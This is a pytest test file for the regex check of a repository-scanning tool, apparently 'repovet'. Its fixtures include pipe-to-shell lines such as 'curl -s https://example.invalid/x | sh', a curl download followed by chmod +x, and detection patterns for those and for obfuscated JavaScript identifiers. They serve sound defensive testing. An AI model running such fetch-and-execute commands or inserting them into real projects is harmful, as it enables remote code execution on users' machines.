import pytest

from helpers import run_check, view_of
from repovet.engine.checks import BUILDERS
from repovet.engine.checks.base import BuildEnv, CheckError, Params
from repovet.engine.checks.regex import looks_like_regex_literal
from repovet.limits import Limits
from repovet.models import Confidence, CoverageStatus


def test_line_scope_reports_line_and_column() -> None:
    text = "all:\n\tcurl -s https://example.invalid/x | sh\n"
    (match,) = run_check({"type": "regex", "pattern": r"curl\b"}, "Makefile", text)
    assert (match.line, match.column) == (2, 2)
    assert match.values["match"] == "curl"
    assert match.evidence == "\tcurl -s https://example.invalid/x | sh"


def test_ignore_skips_lines() -> None:
    spec = {"type": "regex", "pattern": "curl", "ignore": "^#"}
    assert not run_check(spec, "a.sh", "# curl is documented here\n")
    assert run_check(spec, "a.sh", "curl x\n")


def test_text_scope_spans_lines() -> None:
    spec = {"type": "regex", "pattern": r"begin\s+end", "scope": "text"}
    (match,) = run_check(spec, "a.txt", "x\nbegin\n  end\n")
    assert match.line == 2


def test_flags_and_named_patterns() -> None:
    spec = {"type": "regex", "pattern": "{{fetch}} it", "flags": ["ignorecase"]}
    assert run_check(spec, "a.txt", "WGET it\n", patterns={"fetch": "wget|curl"})


def test_long_lines_are_skipped_and_noted() -> None:
    limits = Limits(max_line_length=10)
    check = BUILDERS["regex"](Params({"type": "regex", "pattern": "x"}), BuildEnv({}))
    view = view_of("a.txt", "x" * 20 + "\nx\n", limits)
    matches = list(check.matches(view))
    assert [m.line for m in matches] == [2]
    assert view._coverage.items()[0].status == CoverageStatus.PARTIAL


@pytest.mark.parametrize(
    "spec",
    [
        {"type": "regex"},
        {"type": "regex", "pattern": "a*"},
        {"type": "regex", "pattern": "x", "scope": "file"},
        {"type": "regex", "pattern": "x", "flags": ["verbose"]},
    ],
)
def test_invalid_specs(spec: dict[str, object]) -> None:
    with pytest.raises(CheckError):
        run_check(spec, "a", "x")


def test_file_requires_other_patterns_anywhere_in_the_file() -> None:
    spec = {"type": "regex", "pattern": r"chmod \+x", "file_requires": ["curl", "https"]}
    assert run_check(spec, "a.sh", "curl https://example.invalid -o t\nchmod +x t\n")[0].line == 2
    assert run_check(spec, "a.sh", "chmod +x t\ncurl -o t\n") == []


def test_long_lines_option() -> None:
    line = "x" * 25_000 + " _0x1a2b"
    spec = {"type": "regex", "pattern": "_0x[0-9a-f]{4}"}
    assert run_check(spec, "a.js", line) == []
    assert len(run_check({**spec, "long_lines": True}, "a.js", line)) == 1
    text_spec = {**spec, "scope": "text"}
    assert run_check(text_spec, "a.js", line) == []
    assert len(run_check({**text_spec, "long_lines": True}, "a.js", line)) == 1


@pytest.mark.parametrize(
    ("line", "expected"),
    [
        (r'    (r"curl\s+[^|]*\|\s*(?:sudo\s+)?python", 0.9),', True),
        (r"const re = /wget\s+[^|]*\|\s*(?:node|python)/;", True),
        ("x = 'curl https://example.invalid | sh' + y", False),  # no regex syntax
        (r"curl -s https://example.invalid/i.sh | grep -v '^\s*#' | sh", False),
        ('os.system("curl -s https://example.invalid/i.sh | sh")', False),
        (r'say "a" then curl\s+x | sh', False),  # the quote before is closed
    ],
)
def test_looks_like_regex_literal(line: str, expected: bool) -> None:
    start = line.index("curl") if "curl" in line else line.index("wget")
    assert looks_like_regex_literal(line, start, len(line)) is expected


def test_demote_regex_literals_lowers_confidence_per_match() -> None:
    spec = {"type": "regex", "pattern": r"curl[^\n]*\|[ \t]*sh\b", "demote_regex_literals": True}
    text = 'P = r"curl\\s+[^|]*\\| sh"\nos.system("curl https://example.invalid | sh")\n'
    first, second = run_check(spec, "a.py", text)
    assert first.confidence == Confidence.LOW
    assert second.confidence is None
    plain = {"type": "regex", "pattern": r"curl[^\n]*\|[ \t]*sh\b"}
    assert all(m.confidence is None for m in run_check(plain, "a.py", text))
